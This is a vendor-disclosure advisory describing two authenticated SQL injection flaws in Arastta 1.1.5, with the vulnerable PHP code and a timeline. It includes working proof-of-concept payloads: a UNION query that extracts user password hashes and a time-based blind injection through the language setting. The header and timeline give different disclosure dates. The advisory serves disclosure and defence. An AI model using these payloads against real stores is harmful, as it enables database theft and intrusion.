 
1. Introduction
 
Affected Product:    Arastta 1.1.5
Fixed in:            not fixed
Fixed Version Link:  n/a
Vendor Website:      http://arastta.org/
Vulnerability Type:  SQL Injection
Remote Exploitable:  Yes
Reported to vendor:  11/21/2015
Disclosed to public: 12/21/2015
Release mode:        Full Disclosure
CVE:                 n/a
Credits              Tim Coen of Curesec GmbH
 
2. Overview
 
Arastta is an eCommerce software written in PHP. In version 1.1.5, it is
vulnerable to two SQL injection vulnerabilities, one normal injection when
searching for products via tags, and one blind injection via the language
setting. Both of them require a user with special privileges to trigger.
 
3. SQL Injection 1
 
CVSS
 
Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
 
Description
 
There is an SQL Injection when retrieving products.
 
Currently, only the "filter" variable is vulnerable. Note that the "tag_name"
variable would also be vulnerable to SQL injection, if there wasn&#039;t a filter
that forbid single quotes in the URL. As defense in depth, it might be a good
idea to sanitize that value here as well.
 
Note that an account with the right "Catalog -> Filters" is needed to exploit
this issue.
 
Proof of Concept
 
 
POST /Arastta/admin/index.php?route=catalog/product/autocomplete&token=3d6cfa8f9f602a4f47e0dfbdb989a469&filter_name=a&tag_name= HTTP/1.1
 
tag_text[][value]=abc&#039;) union all select password from gv4_user -- -
 
Code
 
 
/admin/model/catalog/product.php
public function getTags($tag_name, $filter_tags = null) {
    [...]
    $query = $this->db->query("SELECT DISTINCT(tag) FROM `" . DB_PREFIX . "product_description` WHERE `tag` LIKE &#039;%" . $tag_name . "%&#039;" . $filter);
 
/admin/controller/catalog/product.php
            public function autocomplete() {
    [...]
    if (isset($this->request->get[&#039;tag_name&#039;])) {
 
$this->load->model(&#039;catalog/product&#039;);
 
if (isset($this->request->get[&#039;tag_name&#039;])) {
    $tag_name = $this->request->get[&#039;tag_name&#039;];
} else {
    $tag_name = &#039;&#039;;
}
 
$filter = null;
 
if(isset($this->request->post[&#039;tag_text&#039;])) {
    $filter = $this->request->post[&#039;tag_text&#039;];
}
 
$results = $this->model_catalog_product->getTags($tag_name, $filter);
 
foreach ($results as $result) {
    $json[] = array(
&#039;tag&#039; => $result,
&#039;tag_id&#039; => $result
    );
}
    }
 
4. SQL Injection 2
 
CVSS
 
Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
 
Description
 
There is a second order timing based SQL injection when choosing the language
setting.
 
An admin account with the right "Setting -> Setting" is needed to exploit this
issue.
 
Alternatively, a user with the right "Localisation -> Languages" can inject a
payload as well. However, a user with the right "Setting -> Setting" is still
needed to choose the malicious language to trigger the payload.
 
Proof of Concept
 
 
Visit the setting page:
http://localhost/Arastta/admin/index.php?route=setting/setting
 
For the config_language and config_admin_language parameters use:
en&#039; AND IF(SUBSTRING(version(), 1, 1)=&#039;5&#039;,BENCHMARK(50000000,ENCODE(&#039;MSG&#039;,&#039;by 5 seconds&#039;)),null) -- -
 
Visiting any site will trigger the injected code.
 
Code
 
 
/Arastta/system/library/utility.php
public function getDefaultLanguage(){
    if (!is_object($this->config)) {
return;
    }
 
    $store_id = $this->config->get(&#039;config_store_id&#039;);
 
    if (Client::isAdmin()){
$sql = "SELECT * FROM " . DB_PREFIX . "setting WHERE `key` = &#039;config_admin_language&#039; AND `store_id` = &#039;" . $store_id . "&#039;";
    } else {
$sql = "SELECT * FROM " . DB_PREFIX . "setting WHERE `key` = &#039;config_language&#039; AND `store_id` = &#039;" . $store_id . "&#039;";
    }
    $query = $this->db->query($sql);
    $code = $query->row[&#039;value&#039;];
 
    $language = $this->db->query("SELECT * FROM " . DB_PREFIX . "language WHERE `code` = &#039;" . $code . "&#039;");
 
    return $language->row;
}
 
5. Solution
 
This issue was not fixed by the vendor.
 
6. Report Timeline
 
11/21/2015 Informed Vendor about Issue (no reply)
12/10/2015 Reminded Vendor of Disclosure Date (no reply)
12/17/2015 Disclosed to public
 
 
Blog Reference:
https://blog.curesec.com/article/blog/Arastta-115-SQL-Injection-131.html

